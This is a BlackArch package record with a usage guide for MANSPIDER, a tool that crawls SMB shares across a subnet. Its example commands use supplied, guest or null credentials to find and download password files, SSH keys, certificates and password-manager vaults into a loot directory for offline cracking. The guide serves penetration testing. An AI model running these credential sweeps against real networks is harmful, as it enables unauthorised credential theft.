---
name: "manspider"
categories:
  - blackarch-scanner
version: "142.c182b09"
homepage: "https://github.com/blacklanternsecurity/MANSPIDER"
packaged-by: [blackarch]
blackarch-builddate: "2026-10-31"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "blacklanternsecurity/MANSPIDER"
github-stars: 1437
github-pushed: "2026-11-06"
github-archived: false
github-issues: 20
github-match: "exact"
gh-checked: "2026-11-07"
worth: 7.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 58
gh-activity-checked: "2026-11-09"
---

# manspider

> Crawl every SMB share on a network and search filenames and file contents — regex throughout.

## What it's for

MANSPIDER spiders all reachable SMB shares on target systems — trying the credentials you supply, then falling back to guest, then to a null session — and matches files by name pattern, extension, content regex, or modification date. Matches are downloaded into `~/.manspider/loot` (`-n` disables), and text extraction (PDF, DOCX, XLSX, PPTX, images via OCR) makes the content search work inside office documents. Built for "find the credentials, keys and finance files hidden on the file servers" sweeps across a subnet.

## Typical use cases

### Hunt credential-sounding filenames across a subnet

Sweep a whole network for interesting names.

```
manspider 198.51.100.0/24 -f passw user admin account login cred -d CORP -u user -p Password1
```

Outcome: crawls every share on the subnet with those credentials (falling back to guest/null where they fail) and downloads filename matches into `~/.manspider/loot`; add `-n` to report without downloading.

### Search inside documents

Grep the contents, not just the names.

```
manspider target.example.com -c passw -e xlsx csv docx pdf -d CORP -u user -p Password1
```

Outcome: opens spreadsheets and documents (text extraction including OCR for images) and reports/downloads those whose content matches the regex — e.g. any spreadsheet containing "passw". Content patterns are full regexes: `-c 'BEGIN .{1,10} PRIVATE KEY'` finds exposed private keys in any text file.

### Grab keys, certs and password vaults by extension

Collect whole file classes at once.

```
manspider target.example.com -e pem key ppk pfx kdbx -d CORP -u user -p Password1
```

Outcome: downloads every file with those extensions from all shares — SSH keys, certificates, and password-manager databases (kdbx, 1pif, opvault, dashlane and more) all land in the loot directory for offline cracking.
